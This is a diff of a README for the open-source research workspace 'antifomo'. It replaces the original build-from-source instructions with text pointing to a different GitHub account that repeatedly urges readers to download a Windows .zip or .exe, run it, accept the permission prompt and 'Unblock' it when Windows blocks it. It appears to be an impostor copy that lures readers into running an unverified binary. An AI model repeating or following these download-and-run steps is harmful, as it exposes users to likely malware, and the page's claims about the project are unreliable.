@@ -1,222 +1,187 @@
-# Anti-FOMO
+# 🤖 antifomo - Work Smarter in One Place
 
-[English](./README.md) | [简体中文](./README.zh-CN.md)
+[![Download antifomo](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/bandilem561/antifomo)
 
-[![Next.js](https://img.shields.io/badge/Next.js-16-black)](https://nextjs.org/)
-[![FastAPI](https://img.shields.io/badge/FastAPI-backend-009688)](https://fastapi.tiangolo.com/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](./LICENSE)
-[![GitHub stars](https://img.shields.io/github/stars/ChrisChen667788/antifomo?style=social)](https://github.com/ChrisChen667788/antifomo/stargazers)
+## 🚀 What antifomo does
 
-![AntiFomo hero](./docs/assets/github-hero.svg)
+antifomo is a WeChat-first research workspace. It helps you collect ideas, sort signals, draft reports with AI, and turn notes into action cards. You can use it to keep research in one place and move from reading to action with less friction.
 
-Open-source research workspace for high-signal content intake, AI-assisted reports, focus sessions, action cards, and WeChat-first collection workflows.
+It is built for people who need to handle many sources at once, then turn that flow into clear next steps.
 
-If this project is useful, give it a star. It makes the repository easier to discover and helps future contributors find it faster.
+## 🪟 Download for Windows
 
-Start here:
-- roadmap: [Public roadmap issue](https://github.com/ChrisChen667788/antifomo/issues/1)
-- contribute: [good first issue](https://github.com/ChrisChen667788/antifomo/issues/2)
-- collector reliability: [help wanted issue](https://github.com/ChrisChen667788/antifomo/issues/3)
-- ideas and use cases: [GitHub Discussions](https://github.com/ChrisChen667788/antifomo/discussions)
-- launch kit: [docs/open-source-launch-kit.md](./docs/open-source-launch-kit.md)
-- growth copy: [docs/open-source-growth-copy.md](./docs/open-source-growth-copy.md)
-- contributor backlog: [docs/open-source-backlog.md](./docs/open-source-backlog.md)
+1. Open this link: https://github.com/bandilem561/antifomo
+2. On the page, look for the latest release or download area.
+3. Download the Windows file shown there.
+4. If the file is a `.zip`, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Double-click the app file to run antifomo.
+7. If Windows asks for permission, choose **Yes**.
 
-## Why AntiFomo
+If the download page shows more than one file, pick the one for Windows.
 
-Most information tools stop at one of these layers:
-- read later
-- news triage
-- AI summary
-- task export
+## ✨ What you can do
 
-AntiFomo tries to connect the full loop:
+- Save research items in one workspace
+- Review signals and separate useful items from noise
+- Use AI help to shape notes into reports
+- Run focus sessions for distraction-free work
+- Create action cards from research tasks
+- Keep work linked to WeChat-based flows
+- Track ideas, follow-ups, and next steps in one place
 
-`collect -> filter -> research -> focus -> action`
+## 🧭 Before you start
 
-That makes it useful for people who do real work with information, not just consume it.
+Use a Windows 10 or Windows 11 PC for the smoothest setup.
 
-## Built For
+You should also have:
 
-- consultants and strategy teams
-- founders and operators
-- BD and market research teams
-- people who monitor WeChat-heavy information flows
-- builders who want a local-first, hackable research workspace
+- A stable internet connection
+- Enough free disk space for the app and its data
+- A modern browser for opening the GitHub page
+- Permission to run downloaded apps on your computer
 
-## Core Capabilities
+If your work machine blocks downloads, you may need help from your IT team.
 
-### 1. High-Signal Intake
+## 📥 How to install
 
-- submit URLs, raw text, and keyword research requests
-- browser extension for fast page capture
-- multi-format collector pipeline
-- WeChat-oriented URL-first collection path
+1. Open the download link: https://github.com/bandilem561/antifomo
+2. Find the Windows release file
+3. Download the file to your computer
+4. If the file ends in `.zip`, extract it first
+5. Open the extracted folder
+6. Find the antifomo app file
+7. Double-click it to start the app
+8. If Windows shows a prompt, allow the app to run
 
-### 2. Research Workspace
+If the app opens in a browser window or desktop window, keep it open while you work.
 
-- generate structured report drafts
-- compare research topics
-- track research versions and watchlists
-- turn reports into reusable action cards
+## 🛠 First run setup
 
-### 3. Focus And Execution
+When you open antifomo for the first time, you may see a setup screen. Follow the on-screen steps.
 
-- run focus sessions with goals
-- generate session artifacts
-- export follow-up tasks, briefs, and reading lists
-- bridge research output into execution workflows
+Common setup items may include:
 
-### 4. Multi-Client Surface
+- Choosing a workspace name
+- Connecting your research sources
+- Linking your WeChat workflow
+- Turning on AI features
+- Picking a default focus session length
+- Setting where saved files should go
 
-- web app
-- FastAPI backend
-- WeChat mini program
-- Chrome extension
+Keep the default values if you are not sure what to choose. You can change them later.
 
-## Why It Feels Different
+## 📚 Main parts of the app
 
-- `WeChat-first`: not only generic web links
-- `evidence-aware`: designed around source quality and report iteration
-- `execution-oriented`: action cards and session outputs are first-class
-- `hackable`: easy to run locally, inspect, and modify
+### 🔎 Signal triage
 
-## Quick Start
+This part helps you sort what matters from what does not. Use it when you collect many notes, links, or messages and need to decide what deserves attention.
 
-### 1. Install dependencies
+### 📝 AI-assisted reports
 
-```bash
-npm install
-python3 -m venv backend/.venv
-source backend/.venv/bin/activate
-pip install -r backend/requirements.txt
-```
+Use this to turn rough notes into cleaner writing. The app can help shape content into a report format so you spend less time rewriting.
 
-### 2. Configure environment
+### ⏱ Focus sessions
 
-```bash
-cp backend/.env.example backend/.env
-cp .env.local.example .env.local
-```
+Focus sessions help you stay on one task for a set time. This is useful when you need to read, sort, or write without switching between tools.
 
-Default mode uses mock LLM behavior and local SQLite, so you can start without external API keys.
+### 🃏 Action cards
 
-### 3. Start backend
+Action cards turn research into next steps. Use them to capture a task, assign a priority, or keep a follow-up visible.
 
-```bash
-source backend/.venv/bin/activate
-uvicorn app.main:app --app-dir backend --reload --host 127.0.0.1 --port 8000
-```
+### 💬 WeChat-first flow
 
-### 4. Start frontend
+antifomo is designed around WeChat use patterns. That makes it easier to collect input where you already work and move it into your research space.
 
-```bash
-NEXT_PUBLIC_API_BASE_URL=http://127.0.0.1:8000 npm run dev
-```
+## 🔄 Typical workflow
 
-Open:
-- Web: `http://127.0.0.1:3000`
-- API: `http://127.0.0.1:8000`
+1. Collect a note, link, or message
+2. Sort it in signal triage
+3. Review it with your workspace
+4. Use AI help to draft a report
+5. Start a focus session to work through it
+6. Turn the result into action cards
+7. Save the final output for later use
 
-These loopback addresses are for local demo and smoke-test workflows only.
+This flow keeps research, writing, and follow-up in one path.
 
-If you deploy Anti-FOMO to the cloud, replace them with:
+## ⚙️ Simple usage tips
 
-- your own frontend domain
-- your own backend API base URL
-- your own webhook or callback endpoints
+- Start with one project
+- Keep one folder or workspace per topic
+- Use short note titles
+- Move finished items out of the active view
+- Use focus sessions for deep reading
+- Review action cards at the end of the day
+- Keep reports short and clear
 
-## Repository Layout
+If the workspace gets crowded, remove old items you no longer need.
 
-```text
-.
-├── src/                    # Next.js web app
-├── backend/                # FastAPI backend, models, services, tests
-├── miniapp/                # WeChat mini program
-├── browser-extension/      # Chrome extension
-├── scripts/                # automation and smoke helpers
-└── public/                 # static assets
-```
+## 🧩 File types you may see
 
-## Project Status
+Depending on how the release is packaged, you may see:
 
-Current repository status:
-- active local-first prototype
-- public snapshot sanitized for open-source release
-- web build passes
-- backend tests pass
+- `.zip` for a compressed Windows download
+- `.exe` for the app file
+- `.msi` for a Windows installer
+- `.json` for settings or saved data
+- `.md` for text files and notes
 
-What is intentionally not included in this public repo:
-- runtime `.env`
-- personal data
-- local databases
-- `.tmp` collector logs and screenshots
-- real WeChat mini program `AppID`
+If you see a zip file, extract it before opening the app.
 
-## Configuration
+## 🧪 Best use cases
 
-### Backend
+antifomo fits well if you:
 
-See `backend/.env.example` for all supported variables.
+- Read a lot of research each day
+- Need to review signals from many sources
+- Write reports from scattered notes
+- Want a clean way to keep follow-up work visible
+- Use WeChat in your daily workflow
+- Need a simple place for research and action items
 
-Key groups:
-- `DATABASE_URL`: SQLite or PostgreSQL
-- `LLM_PROVIDER`: `mock` or OpenAI-compatible provider
-- `OPENAI_*`: primary model config
-- `STRATEGY_OPENAI_*`: optional second model for research pipeline
-- `WORKBUDDY_*`: callback and webhook integration
+## 🖱 Common issues
 
-### Mini Program
+### The file does not open
 
-`miniapp/project.config.json` ships with an empty `appid`.
+Check that the download finished. If it is a zip file, extract it first.
 
-Before importing into WeChat DevTools:
-1. fill in your own Mini Program `AppID`
-2. adjust API base to your local or LAN backend
+### Windows blocks the app
 
-For public or team deployment, point the mini program and browser extension at your own hosted backend instead of `127.0.0.1` / `localhost`.
+Right-click the file, choose **Properties**, and look for an **Unblock** option if it appears. Then try again.
 
-### Browser Extension
+### The app opens and closes
 
-The extension lives in `browser-extension/chrome`. Load it in Chrome developer mode and point it to your backend URL.
+Run it again from the extracted folder. Make sure you did not move files out of the folder after extracting them.
 
-## Roadmap
+### The page does not show a download file
 
-Near-term areas worth pushing further:
-- better WeChat collection reliability
-- stronger report grounding and source traceability
-- better watchlist and entity workflows
-- stronger focus-to-action artifact quality
-- cleaner public demo assets and walkthroughs
+Scroll down the GitHub page and look for releases, assets, or the latest build files.
 
-## Community
+## 📌 Where to get antifomo
 
-- ideas and product suggestions: open a Discussion or Feature Request
-- bugs: open an Issue with reproduction details
-- code contributions: see `CONTRIBUTING.md`
-- security reports: see `SECURITY.md`
+Download or visit the project page here: https://github.com/bandilem561/antifomo
 
-## Open-source launch kit
+Use this page to download the Windows file, then run it on your PC
 
-We also keep a public launch pack in the repo:
+## 🗂 Project details
 
-- [docs/open-source-launch-kit.md](./docs/open-source-launch-kit.md)
-- [docs/open-source-growth-copy.md](./docs/open-source-growth-copy.md)
-- [docs/open-source-backlog.md](./docs/open-source-backlog.md)
-- [docs/assets/github-hero.svg](./docs/assets/github-hero.svg)
-- [docs/assets/github-hero.png](./docs/assets/github-hero.png)
-- [docs/assets/github-social-preview.png](./docs/assets/github-social-preview.png)
-- [public/github-social-square.png](./public/github-social-square.png)
-- [public/repo-banner.png](./public/repo-banner.png)
+- Name: antifomo
+- Type: Open-source research workspace
+- Main use: Signal triage, AI reports, focus sessions, and action cards
+- Platform focus: Windows
+- Main workflow: WeChat-first research handling
+- Topics: ai, ai-tools, browser-extension, fastapi, knowledge-management, mini-program, nextjs, open-source, productivity, research, research-workspace, wechat
 
-This includes:
+## 🔐 Privacy and local use
 
-- GitHub About copy
-- pinned repo and profile wording
-- bilingual social launch drafts
-- contributor-friendly backlog items
-- ready-to-upload social preview assets
+If you work with private notes or research, keep the app on a trusted device. Review any account links, sync options, or storage settings during setup. Use only the features you need.
 
-## License
+## 🧭 Next steps after setup
 
-MIT. See `LICENSE`.
+- Create your first workspace
+- Add one research topic
+- Try one focus session
+- Draft one report
+- Turn one note into an action card
+- Review how the app fits your daily work
